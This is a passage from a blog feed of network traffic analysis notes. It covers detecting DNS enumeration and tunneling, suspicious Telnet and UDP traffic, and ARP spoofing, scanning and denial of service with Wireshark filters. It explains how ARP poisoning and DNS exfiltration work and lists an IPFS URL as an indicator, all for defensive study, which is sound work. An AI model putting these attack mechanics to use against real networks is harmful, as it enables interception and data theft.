      <tr>
          <th><strong>Step</strong></th>
          <th><strong>Description</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>1. Query Initiation</code></td>
          <td>The client sends a DNS reverse query to its configured DNS resolver (server) with the IP address it wants to find the domain name.</td>
      </tr>
      <tr>
          <td><code>2. Reverse Lookup Zones</code></td>
          <td>The DNS resolver checks if it is authoritative for the reverse lookup zone that corresponds to the IP range as determined by the received IP address. Aka <code>192.0.2.1</code>, the reverse zone would be <code>1.2.0.192.in-addr.arpa</code></td>
      </tr>
      <tr>
          <td><code>3. PTR Record Query</code></td>
          <td>The DNS resolver then looks for a PTR record on the reverse lookup zone that corresponds to the provided IP address.</td>
      </tr>
      <tr>
          <td><code>4. Response</code></td>
          <td>If a matching PTR is found, the DNS server (resolver) then returns the FQDN of the IP for the client.</td>
      </tr>
  </tbody>
</table>
<p><img src="/Network%20Traffic%20Analysis/reverse-dns-lookup-diagram.webp" alt="reverse-dns-lookup-diagram"></p>
<h2 id="dns-record-types">DNS Record Types</h2>
<ul>
<li>DNS has many different record types responsible for holding different information.</li>
<li>We should be familiar with these, especially when monitoring DNS traffic.</li>
</ul>
<table>
  <thead>
      <tr>
          <th><strong>Record Type</strong></th>
          <th><strong>Description</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>A</code> (Address)</td>
          <td>This record maps a domain name to an IPv4 address</td>
      </tr>
      <tr>
          <td><code>AAAA</code> (Ipv6 Address)</td>
          <td>This record maps a domain name to an IPv6 address</td>
      </tr>
      <tr>
          <td><code>CNAME</code> (Canonical Name)</td>
          <td>This record creates an alias for the domain name. Aka hello.com = world.com</td>
      </tr>
      <tr>
          <td><code>MX</code> (Mail Exchange)</td>
          <td>This record specifies the mail server responsible for receiving email messages on behalf of the domain.</td>
      </tr>
      <tr>
          <td><code>NS</code> (Name Server)</td>
          <td>This specifies an authoritative name servers for a domain.</td>
      </tr>
      <tr>
          <td><code>PTR</code> (Pointer)</td>
          <td>This is used in reverse queries to map an IP to a domain name</td>
      </tr>
      <tr>
          <td><code>TXT</code> (Text)</td>
          <td>This is used to specify text associated with the domain</td>
      </tr>
      <tr>
          <td><code>SOA</code> (Start of Authority)</td>
          <td>This contains administrative information about the zone</td>
      </tr>
  </tbody>
</table>
<h2 id="finding-dns-enumeration-attempts">Finding DNS Enumeration Attempts</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>dns_enum_detection.pcapng</code>.</p>
</li>
<li>
<p>We might notice a significant amount of DNS traffic from one host when we start to look at our raw output in Wireshark.</p>
</li>
<li>
<p><code>dns</code>
<img src="/Network%20Traffic%20Analysis/1-DNSTraffic.png" alt="1-DNSTraffic"></p>
</li>
<li>
<p>We might even notice this traffic concluded/ended with something like <code>ANY</code>:
<img src="/Network%20Traffic%20Analysis/2-DNSTraffic.png" alt="2-DNSTraffic"></p>
</li>
<li>
<p>This would be:</p>
<ul>
<li>A clear indication of DNS enumeration.</li>
<li>And possibly even subdomain enumeration from an attacker.</li>
</ul>
</li>
</ul>
<h2 id="finding-dns-tunneling">Finding DNS Tunneling</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>dns_tunneling.pcapng</code>.</p>
</li>
<li>
<p>On the other hand, we might notice a good amount of text records from one host.</p>
</li>
<li>
<p>This could indicate DNS tunneling.</p>
</li>
<li>
<p>Like ICMP tunneling, attackers can and have utilized DNS forward and reverse lookup queries to perform data exfiltration.</p>
</li>
<li>
<p>They do so by appending the data they would like to exfiltrate as a part of the TXT field.</p>
</li>
<li>
<p>If this was happening it might look like the following.
<img src="/Network%20Traffic%20Analysis/3-DNSTraffic.png" alt="3-DNSTraffic"></p>
</li>
<li>
<p>Upon closer inspection, anomalous text may be visible in the lower right-hand corner of the screen.
<img src="/Network%20Traffic%20Analysis/4-DNSTraffic.png" alt="4-DNSTraffic"></p>
</li>
<li>
<p>However, in many cases, this data might be encoded or encrypted, and we might notice the following.
<img src="/Network%20Traffic%20Analysis/5-DNSTraffic.png" alt="5-DNSTraffic"></p>
</li>
<li>
<p>We can retrieve this value from Wireshark by locating it like the following and right-clicking the value to specify to copy it.
<img src="/Network%20Traffic%20Analysis/6-DNSTraffic.png" alt="6-DNSTraffic"></p>
</li>
<li>
<p>Then if we were to go into our Linux machine, in this case we could utilize something like <code>base64 -d</code> to retrieve the true value.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;VTBaU1EyVXhaSFprVjNocldETnNkbVJXT1cxaU0wb3pXVmhLYTFneU1XeFlNMUp2WVZoT1ptTklTbXhrU0ZJMVdETkNjMXBYUm5wYQpXREJMQ2c9PQo=&#39;</span> | base64 -d
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>U0ZSQ2UxZHZkV3hrWDNsdmRWOW1iM0ozWVhKa1gyMWxYM1JvYVhOZmNISmxkSFI1WDNCc1pXRnpaWDBLCg==
</span></span></code></pre></div><ul>
<li>However, in some cases attackers will double if not triple encode the value they are attempting to exfiltrate through DNS tunneling, so we might need to do the following.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;VTBaU1EyVXhaSFprVjNocldETnNkbVJXT1cxaU0wb3pXVmhLYTFneU1XeFlNMUp2WVZoT1ptTklTbXhrU0ZJMVdETkNjMXBYUm5wYQpXREJMQ2c9PQo=&#39;</span> | base64 -d | base64 -d | base64 -d
</span></span></code></pre></div><ul>
<li>
<p>However, we might need to do more than just base64 decode these values, as in many cases as mentioned these values might be encrypted.</p>
</li>
<li>
<p>Attackers might conduct DNS tunneling for the following reasons:</p>
</li>
</ul>
<table>
  <thead>
      <tr>
          <th><strong>Step</strong></th>
          <th><strong>Description</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>1. Data Exfiltration</code></td>
          <td>As shown above DNS tunneling can be helpful for attackers trying to get data out of our network without getting caught.</td>
      </tr>
      <tr>
          <td><code>2. Command and Control</code></td>
          <td>Some malware and malicious agents will utilize DNS tunneling on compromised systems in order to communicate back to their command and control servers. Notably, we might see this method of usage in botnets.</td>
      </tr>
      <tr>
          <td><code>3. Bypassing Firewalls and Proxies</code></td>
          <td>DNS tunneling allows attackers to bypass firewalls and web proxies that only monitor HTTP/HTTPs traffic. DNS traffic is traditionally allowed to pass through network boundaries. As such, it is important that we monitor and control this traffic.</td>
      </tr>
      <tr>
          <td><code>4. Domain Generation Algorithms (DGAs)</code></td>
          <td>Some more advanced malware will utilize DNS tunnels to communicate back to their command and control servers that use dynamically generated domain names through DGAs. This makes it much more difficult for us to detect and block these domain names.</td>
      </tr>
  </tbody>
</table>
<h2 id="the-interplanetary-file-system-and-dns-tunneling">The Interplanetary File System and DNS Tunneling</h2>
<ul>
<li>It has been observed in recent years that advanced threat actors will utilize the Interplanetary file System to store and pull malicious files.</li>
<li>As such we should always watch out for DNS and HTTP/HTTPs traffic to URIs like the following:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>https://cloudflare-ipfs.com/ipfs/QmS6eyoGjENZTMxM7UdqBk6Z3U3TZPAVeJXdgp9VK4o1Sz
</span></span></code></pre></div><ul>
<li>These forms of attacks can be exceptionally difficult to detect as IPFS innately operates on a peer to peer basis.</li>
<li>To learn more, we can research into IPFS.</li>
</ul>
<p><a href="https://developers.cloudflare.com/web3/ipfs-gateway/concepts/ipfs/">Interplanetary File System</a>.</p>
<hr>
<h1 id="strange-telnet--udp-connections">Strange Telnet &amp; UDP Connections</h1>
<ul>
<li>When analyzing network traffic for unusual activity, pay close attention to Telnet and UDP protocols.</li>
<li>These protocols are sometimes missed but can provide valuable insights.</li>
</ul>
<p><img src="/Network%20Traffic%20Analysis/Internet.png" alt="Internet"></p>
<ul>
<li>
<p>Telnet:</p>
<ul>
<li>Is a bidirectional network protocol.</li>
<li>Defined in RFC 854.</li>
<li>Enabling interactive communication between devices.</li>
</ul>
</li>
<li>
<p>Developed in the 1970s, its use has declined significantly in favor of SSH.</p>
</li>
<li>
<p>Legacy systems may still use Telnet for remote command and control of Microsoft terminal services.</p>
</li>
<li>
<p>However, monitor Telnet communications for suspicious activity, as attackers can exploit it for data exfiltration and tunneling.</p>
</li>
</ul>
<h2 id="finding-traditional-telnet-traffic-port-23">Finding Traditional Telnet Traffic Port 23</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>telnet_tunneling_23.pcapng</code>.</p>
</li>
<li>
<p>Suppose we were to open Wireshark, we might notice some telnet communications originating from Port 23.</p>
</li>
<li>
<p>In this case, we can always inspect this traffic further.
<img src="/Network%20Traffic%20Analysis/1-telnet.png" alt="1-telnet"></p>
</li>
<li>
<p>Telnet traffic is usually unencrypted/decrypted and easy to inspect.</p>
</li>
<li>
<p>However, like ICMP, DNS, and other tunneling methods, attackers can encrypt, encode, or obfuscate this text.</p>
</li>
<li>
<p>Therefore, we should always be cautious.
<img src="/Network%20Traffic%20Analysis/2-telnet.png" alt="2-telnet"></p>
</li>
</ul>
<h2 id="unrecognized-tcp-telnet-in-wireshark">Unrecognized TCP Telnet in Wireshark</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>telnet_tunneling_9999.pcapng</code>.</p>
</li>
<li>
<p>Telnet is just a communication protocol, and as such can be easily redirected to different ports by attackers.</p>
</li>
<li>
<p>Monitoring unusual port activity can help detect potentially malicious actions.</p>
</li>
<li>
<p>For example:
<img src="/Network%20Traffic%20Analysis/3-telnet.png" alt="3-telnet"></p>
</li>
<li>
<p>We may observe frequent communication from a single client on port 9999, which warrants further investigation into the communication&rsquo;s content.
<img src="/Network%20Traffic%20Analysis/4-telnet.png" alt="4-telnet"></p>
</li>
<li>
<p>If we noticed something like above, we would want to follow this TCP stream.
<img src="/Network%20Traffic%20Analysis/5-telnet.png" alt="5-telnet"></p>
</li>
<li>
<p>Doing so can allow us to inspect potentially malicious actions.</p>
</li>
</ul>
<h2 id="telnet-protocol-through-ipv6">Telnet Protocol through IPv6</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>telnet_tunneling_ipv6.pcapng</code>.</p>
</li>
<li>
<p>Observing IPv6 traffic in a network not configured for IPv6 can indicate malicious activity.</p>
</li>
<li>
<p>For example, IPv6 addresses used for telnet connections would be suspicious.
<img src="/Network%20Traffic%20Analysis/6-telnet.png" alt="6-telnet"></p>
</li>
<li>
<p>We can narrow down our filter in Wireshark to only show telnet traffic from these addresses with the following filter.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>((ipv6.src_host == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dst_host == fe80::c9c8:ed3:1b10:f10b)) and telnet
</span></span></code></pre></div><p><img src="/Network%20Traffic%20Analysis/7-telnet.png" alt="7-telnet"></p>
<ul>
<li>Likewise, we can inspect the contents of these packets through their data field, or by following the TCP stream.
<img src="/Network%20Traffic%20Analysis/8-telnet.png" alt="8-telnet"></li>
</ul>
<h2 id="watching-udp-communications">Watching UDP Communications</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>udp_tunneling.pcapng</code>.</p>
</li>
<li>
<p>Attackers may choose to use UDP connections instead of TCP when exfiltrating data.
<img src="/Network%20Traffic%20Analysis/udp-tcp.jpg" alt="udp-tcp"></p>
</li>
<li>
<p>One of the biggest distinguishing aspects between TCP and UDP is that UDP is connectionless and provides fast transmission.</p>
</li>
<li>
<p>Let&rsquo;s take the following traffic for instance.
<img src="/Network%20Traffic%20Analysis/1-udp.png" alt="1-udp"></p>
</li>
<li>
<p>We will notice that instead of a SYN, SYN/ACK, ACK sequence, the communications are immediately sent over to the recipient.</p>
</li>
<li>
<p>Like TCP, we can follow UDP traffic in Wireshark, and inspect its contents.
<img src="/Network%20Traffic%20Analysis/2-udp.png" alt="2-udp"></p>
</li>
</ul>
<h2 id="common-uses-of-udp">Common Uses of UDP</h2>
<ul>
<li>UDP although less reliable than TCP provides quicker connections through its connectionless state.</li>
<li>As such, we might find legitimate traffic that uses UDP like the following:</li>
</ul>
<table>
  <thead>
      <tr>
          <th><strong>Step</strong></th>
          <th><strong>Description</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>1. Real-time Applications</code></td>
          <td>Applications like streaming media, online gaming, real-time voice and video communications</td>
      </tr>
      <tr>
          <td><code>2. DNS (Domain Name System)</code></td>
          <td>DNS queries and responses use UDP</td>
      </tr>
      <tr>
          <td><code>3. DHCP (Dynamic Host Configuration Protocol)</code></td>
          <td>DHCP uses UDP to assign IP addresses and configuration information to network devices.</td>
      </tr>
      <tr>
          <td><code>4. SNMP (Simple Network Management Protocol)</code></td>
          <td>SNMP uses UDP for network monitoring and management</td>
      </tr>
      <tr>
          <td><code>5. TFTP (Trivial File Transfer Protocol)</code></td>
          <td>TFTP uses UDP for simple file transfers, commonly used by older Windows systems and others.</td>
      </tr>
  </tbody>
</table>
<hr>
]]></content>
        </item>
        
        <item>
            <title>Link Layer Attacks</title>
            <link>https://mostafa-ashour.github.io/posts/2026/04/link-layer-attacks/</link>
            <pubDate>Fri, 24 Apr 2026 01:51:12 +0300</pubDate>
            
            <guid>https://mostafa-ashour.github.io/posts/2026/04/link-layer-attacks/</guid>
            <description>&lt;h1 id=&#34;arp-spoofing--abnormality-detection&#34;&gt;ARP Spoofing &amp;amp; Abnormality Detection&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Related PCAP File(s)—&lt;code&gt;ARP_Spoof.pcapng&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Attackers have long misused the &lt;code&gt;Address Resolution Protocol (ARP)&lt;/code&gt; to carry out man-in-the-middle and denial-of-service attacks.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Because of this common abuse, ARP is a key area/point to examine when analyzing network traffic, and it&amp;rsquo;s often the first protocol we check.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Many ARP attacks are broadcast to the entire network rather than targeting individual computers, which makes them easier to find using packet sniffing.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h1 id="arp-spoofing--abnormality-detection">ARP Spoofing &amp; Abnormality Detection</h1>
<ul>
<li>
<p>Related PCAP File(s)—<code>ARP_Spoof.pcapng</code>.</p>
</li>
<li>
<p>Attackers have long misused the <code>Address Resolution Protocol (ARP)</code> to carry out man-in-the-middle and denial-of-service attacks.</p>
</li>
<li>
<p>Because of this common abuse, ARP is a key area/point to examine when analyzing network traffic, and it&rsquo;s often the first protocol we check.</p>
</li>
<li>
<p>Many ARP attacks are broadcast to the entire network rather than targeting individual computers, which makes them easier to find using packet sniffing.</p>
</li>
</ul>
<h2 id="how-address-resolution-protocol-works">How Address Resolution Protocol Works</h2>
<ul>
<li>
<p>Firstly, we need to know how this protocol functions in its standard, or &lsquo;vanilla&rsquo;, operation.
<img src="/Network%20Traffic%20Analysis/ARP-protocol.png" alt="ARP-protocol"></p>
</li>
<li>
<p>In our network, hosts must know the physical address (MAC address) to which they must send their data (Destination MAC), which gave the idea to make ARP Protocol.</p>
</li>
<li>
<p>Let&rsquo;s elucidate (وضح) this with a step-by-step process.</p>
</li>
</ul>
<table>
  <thead>
      <tr>
          <th><strong>Step</strong></th>
          <th><strong>Description</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>1</code></td>
          <td>Imagine our first computer, or Host A, needs to send data to our second computer, Host B. To achieve successful transmission, Host A must ascertain the physical address of Host B.</td>
      </tr>
      <tr>
          <td><code>2</code></td>
          <td>Host A begins by consulting its list of known addresses, the ARP cache, to check if it already possesses this physical address.</td>
      </tr>
      <tr>
          <td><code>3</code></td>
          <td>In the event the address corresponding to the desired IP isn&rsquo;t in the ARP cache, Host A broadcasts an ARP request to all machines in the subnet, inquiring, <code>Who holds the IP x.x.x.x?</code></td>
      </tr>
      <tr>
          <td><code>4</code></td>
          <td>Host B responds to this message with an ARP reply, <code>Hello, Host A, my IP is x.x.x.x and is mapped to MAC address aa:aa:aa:aa:aa:aa.</code></td>
      </tr>
      <tr>
          <td><code>5</code></td>
          <td>On receiving this response, Host A updates its ARP cache with the new IP-to-MAC mapping.</td>
      </tr>
      <tr>
          <td><code>6</code></td>
          <td>Occasionally, a host might install a new interface, or the IP address previously allocated to the host might expire, necessitating an update and remapping of the ARP cache. Such instances could introduce complications when we analyze our network traffic.</td>
      </tr>
  </tbody>
</table>
<h2 id="arp-poisoning--spoofing">ARP Poisoning &amp; Spoofing</h2>
<ul>
<li>
<p>In an ideal scenario, robust controls would be in place to thwart these attacks, but in reality, this isn&rsquo;t always feasible.</p>
</li>
<li>
<p>To comprehend (لفهم) our Indicators of Compromise (IOCs) more effectively, let&rsquo;s delve into the behavior of ARP Poisoning and Spoofing attacks.
<img src="/Network%20Traffic%20Analysis/ARP-spoofing-poisoning.png" alt="ARP-spoofing-poisoning"></p>
</li>
<li>
<p>Detecting these attacks can be challenging, as they mimic the communication structure of standard ARP traffic.</p>
</li>
<li>
<p>Yet, certain ARP requests and replies can reveal their nefarious nature (طبيعة شريرة).</p>
</li>
<li>
<p>Let&rsquo;s illustrate how these attacks function, enabling us to better identify them during our traffic analysis.</p>
</li>
</ul>
<table>
  <thead>
      <tr>
          <th><strong>Step</strong></th>
          <th><strong>Description</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>1</code></td>
          <td>Consider a network with three machines: the victim&rsquo;s computer, the router, and the attacker&rsquo;s machine.</td>
      </tr>
      <tr>
          <td><code>2</code></td>
          <td>The attacker initiates their ARP cache poisoning scheme by dispatching counterfeit ARP messages to both the victim&rsquo;s computer and the router.</td>
      </tr>
      <tr>
          <td><code>3</code></td>
          <td>The message to the victim&rsquo;s computer asserts that the gateway&rsquo;s (router&rsquo;s) IP address corresponds to the physical address of the attacker&rsquo;s machine.</td>
      </tr>
      <tr>
          <td><code>4</code></td>
          <td>Conversely, the message to the router claims that the IP address of the victim&rsquo;s machine maps to the physical address of the attacker&rsquo;s machine.</td>
      </tr>
      <tr>
          <td><code>5</code></td>
          <td>On successfully executing these requests, the attacker may manage to corrupt the ARP cache on both the victim&rsquo;s machine and the router, causing all data to be misdirected to the attacker&rsquo;s machine.</td>
      </tr>
      <tr>
          <td><code>6</code></td>
          <td>If the attacker configures traffic forwarding, they can escalate the situation from a denial-of-service to a man-in-the-middle attack.</td>
      </tr>
      <tr>
          <td><code>7</code></td>
          <td>By examining other layers of our network model, we might discover additional attacks. The attacker could conduct DNS spoofing to redirect web requests to a bogus site or perform SSL stripping to attempt the interception of sensitive data in transit.</td>
      </tr>
  </tbody>
</table>
<ul>
<li>Recognizing/Detecting these attacks is important, but preventing them is an even greater challenge.</li>
<li>Here are some ways we might stop these attacks:
<ol>
<li><code>Static ARP Entries</code>—We can prevent these attacks by making it harder to rewrite and corrupt the ARP cache. However, this will require more network maintenance and monitoring.</li>
<li><code>Switch and Router Port Security</code>—Implementing network profile controls and other measures can ensure that only authorized devices can connect to specific ports on our network devices, effectively blocking machines attempting ARP spoofing/poisoning.</li>
</ol>
</li>
</ul>
<h2 id="finding-arp-spoofing">Finding ARP Spoofing</h2>
<ul>
<li>For detecting ARP Spoofing attacks, we&rsquo;ll need to open the related traffic capture file (<code>ARP_Spoof.pcapng</code>) from this module&rsquo;s resources using Wireshark.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wireshark ARP_Spoof.pcapng
</span></span></code></pre></div><ul>
<li>
<p>Employing this filter <code>arp.opcode</code> streamline our view to focus solely on ARP requests and replies.
<img src="/Network%20Traffic%20Analysis/ARP_Spoof_1.png" alt="ARP_Spoof_1"></p>
</li>
<li>
<p>A key red flag we need to monitor is any anomaly in traffic emanating from a specific host.</p>
</li>
<li>
<p>For instance, one host incessantly broadcasting ARP requests and replies to another host could be a telltale sign of ARP spoofing.</p>
</li>
<li>
<p>In such a scenario, we might identify that the MAC address <code>08:00:27:53:0C:BA is behaving suspiciously</code>.</p>
</li>
<li>
<p>To ascertain this, we can fine-tune our analysis to inspect solely the interactions—both requests and replies—among:</p>
<ul>
<li>The attacker&rsquo;s machine.</li>
<li>The victim&rsquo;s machine.</li>
<li>The router.</li>
</ul>
</li>
<li>
<p>The <code>opcode</code> functionality in <code>Wireshark</code> can simplify this process.</p>
<ol>
<li><code>Opcode == 1</code>—This represents all types of ARP Requests</li>
<li><code>Opcode == 2</code>—This signifies all types of ARP Replies</li>
</ol>
</li>
<li>
<p>As a preliminary step, we could scrutinize the requests dispatched using the following filter.</p>
<ul>
<li><code>arp.opcode == 1</code>
<img src="/Network%20Traffic%20Analysis/ARP_Spoof_2.png" alt="ARP_Spoof_2"></li>
</ul>
</li>
<li>
<p>Almost instantly, we should notice a red flag - an address duplication, accompanied by a warning message.</p>
</li>
<li>
<p>If we delve into the details of the error message within Wireshark, we should be able to extract additional information.
<img src="/Network%20Traffic%20Analysis/ARP_Spoof_3.png" alt="ARP_Spoof_3"></p>
</li>
<li>
<p>Upon immediate inspection, we might discern that one IP address is mapped to two different MAC addresses.</p>
</li>
<li>
<p>We can validate this on a Linux system by executing the appropriate commands.</p>
</li>
</ul>
<h4 id="arp">ARP</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ arp -a | grep 50:eb:f6:ec:0e:7f
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>? <span style="color:#f92672">(</span>192.168.10.4<span style="color:#f92672">)</span> at 50:eb:f6:ec:0e:7f <span style="color:#f92672">[</span>ether<span style="color:#f92672">]</span> on eth0
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ arp -a | grep 08:00:27:53:0c:ba
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>? <span style="color:#f92672">(</span>192.168.10.4<span style="color:#f92672">)</span> at 08:00:27:53:0c:ba <span style="color:#f92672">[</span>ether<span style="color:#f92672">]</span> on eth0
</span></span></code></pre></div><ul>
<li>
<p>In this situation, we might identify that our ARP cache, in fact, contains both MAC addresses allocated to the same IP address - an anomaly that warrants our immediate attention.</p>
</li>
<li>
<p>To sift through more duplicate records, we can utilize the subsequent Wireshark filter.</p>
<ul>
<li><code>arp.duplicate-address-detected &amp;&amp; arp.opcode == 2</code></li>
</ul>
</li>
</ul>
<h2 id="identifying-the-original-ip-addresses">Identifying The Original IP Addresses</h2>
<ul>
<li>
<p>To identify the device that changed its IP address via MAC spoofing, we need to determine the initial IP addresses of the devices.</p>
</li>
<li>
<p>If the attack was solely ARP-based:</p>
<ul>
<li>The victim&rsquo;s IP address should remain constant.</li>
<li>While the attacker&rsquo;s IP address may have changed.</li>
</ul>
</li>
<li>
<p>This information can be found in ARP requests and quickly located using a Wireshark filter.</p>
<ul>
<li><code>(arp.opcode) &amp;&amp; ((eth.src == 08:00:27:53:0c:ba) || (eth.dst == 08:00:27:53:0c:ba))</code>
<img src="/Network%20Traffic%20Analysis/ARP_Spoof_3_1.png" alt="ARP_Spoof_3">
<img src="/Network%20Traffic%20Analysis/ARP_Spoof_4.png" alt="ARP_Spoof_4"></li>
</ul>
</li>
<li>
<p>We might instantly note that the MAC address <code>08:00:27:53:0c:ba</code> was initially linked to the IP address <code>192.168.10.5</code>, but this was recently switched to <code>192.168.10.4</code>.</p>
</li>
<li>
<p>This transition is indicative of a deliberate attempt at ARP spoofing or cache poisoning.</p>
</li>
<li>
<p>Additionally, examining the traffic from these MAC addresses with the following Wireshark filter can prove insightful:</p>
<ul>
<li><code>eth.addr == 50:eb:f6:ec:0e:7f or eth.addr == 08:00:27:53:0c:ba</code>
<img src="/Network%20Traffic%20Analysis/ARP_Spoof_5.png" alt="ARP_Spoof_5"></li>
</ul>
</li>
<li>
<p>We might notice some inconsistencies with TCP connections.</p>
</li>
<li>
<p>If TCP connections are consistently dropping, it&rsquo;s an indication that the attacker is not forwarding traffic between the victim and the router.</p>
</li>
<li>
<p>If the attacker is, in fact, forwarding the traffic and is operating as a man-in-the-middle, we might observe identical or nearly symmetrical transmissions:</p>
<ul>
<li>From the victim to the attacker.</li>
<li>From the attacker to the router.</li>
</ul>
</li>
</ul>
<hr>
<h1 id="arp-scanning--denial-of-service">ARP Scanning &amp; Denial-of-Service</h1>
<ul>
<li>Unusual patterns in the ARP requests and responses can be found.</li>
<li>It is common knowledge that poisoning and spoofing form the core of most ARP-based <code>denial-of-service (DoS)</code> and <code>man-in-the-middle (MITM)</code> attacks.</li>
<li>However, adversaries could also exploit ARP for information gathering.</li>
</ul>
<h2 id="arp-scanning-signs">ARP Scanning Signs</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>ARP_Scan.pcapng</code></p>
</li>
<li>
<p>Some typical red flags indicative of ARP scanning are:</p>
<ol>
<li><code>Broadcast ARP requests sent to sequential IP addresses (.1,.2,.3,...)</code></li>
<li><code>Broadcast ARP requests sent to non-existent hosts</code></li>
<li><code>Potentially, an unusual volume of ARP traffic originating from a malicious or compromised host</code></li>
</ol>
</li>
</ul>
<h2 id="finding-arp-scanning">Finding ARP Scanning</h2>
<ul>
<li>
<p>The following traffic is noticed upon appling this filter <code>arp.opcode</code>:
<img src="/Network%20Traffic%20Analysis/ARP_Scan_1.png" alt="ARP_Scan_1"></p>
</li>
<li>
<p>ARP requests propagated sequentially to all IP addresses by a single host indicate ARP scanning, and is a common feature of widely-used scanners such as <code>Nmap</code>.</p>
</li>
<li>
<p>We might notice that active hosts respond to these requests via their ARP replies.</p>
</li>
<li>
<p>This could signal the successful execution of the information-gathering tactic by the attacker.</p>
</li>
</ul>
<h2 id="identifying-denial-of-service">Identifying Denial-of-Service</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>ARP_Poison.pcapng</code>.</p>
</li>
<li>
<p>An attacker:</p>
<ul>
<li>Can use ARP scanning to identify live hosts.</li>
<li>Then deny service to them by poisoning the subnet and manipulating ARP caches.</li>
</ul>
</li>
<li>
<p>This strategy also enables man-in-the-middle attacks.
<img src="/Network%20Traffic%20Analysis/ARP_DoS_1.png" alt="ARP_DoS_1"></p>
</li>
<li>
<p>Promptly, we might note that the attacker&rsquo;s ARP traffic may shift its focus towards declaring new physical addresses for all live IP addresses.</p>
</li>
<li>
<p>The intent here is to corrupt the router&rsquo;s ARP cache.</p>
</li>
<li>
<p>Conversely, we may witness the duplicate allocation of <code>192.168.10.1</code> to client devices.</p>
</li>
<li>
<p>This indicates that the attacker is attempting to corrupt the ARP cache of these victim devices with the intention of obstructing traffic in both directions.
<img src="/Network%20Traffic%20Analysis/ARP_DoS_2.png" alt="ARP_DoS_2"></p>
</li>
</ul>
<h2 id="responding-to-arp-attacks">Responding To ARP Attacks</h2>
<ul>
<li>
<p>Upon identifying any of these ARP-related anomalies, we might question the suitable course of action to counter these threats.</p>
</li>
<li>
<p>Here are a couple of possibilities:</p>
<ol>
<li><code>Tracing and Identification</code>—The attacker&rsquo;s computer is a real, physical device located somewhere. If we can find its location, we might be able to stop/halt the attack. Sometimes, we discover that the computer launching the attack has also been compromised and is controlled by someone else.</li>
<li><code>Containment</code>—To prevent the attacker from stealing/exfiltrating more information, we can disconnect or isolate the affected area at the switch or router level. This would stop a DoS or MITM attack where it starts.</li>
</ol>
</li>
<li>
<p>Link layer attacks often fly under the radar.</p>
</li>
<li>
<p>While they may seem insignificant to identify and investigate, their detection could be pivotal in preventing the exfiltration of data from higher layers of the OSI model.</p>
</li>
</ul>
<hr>
<h1 id="80211-denial-of-service">802.11 Denial of Service</h1>
<ul>
<li>
<p>Related PCAP File(s)—<code>deauthandbadauth.cap</code>.</p>
</li>
<li>
<p>In traffic analysis, examining link-layer protocols and communications is always crucial.</p>
</li>
<li>
<p>A common link-layer attack targets <code>Wi-Fi (802.11)</code>.</p>
</li>
<li>
<p>We might easily overlook this type of attack, but because human errors can compromise our perimeter security, regular audits of our wireless networks are vital.</p>
</li>
</ul>
<h2 id="capturing-80211-traffic">Capturing 802.11 Traffic</h2>
<ul>
<li>
<p>To analyze raw 802.11 network traffic, you&rsquo;ll need either a <em><strong>Wireless Intrusion Detection System (WIDS)</strong></em> or a <em><strong>Wireless Intrusion Prevention System (WIPS)</strong></em>.</p>
</li>
<li>
<p>Alternatively, you can use a wireless NIC (network interface card) that&rsquo;s set to monitor mode.</p>
</li>
<li>
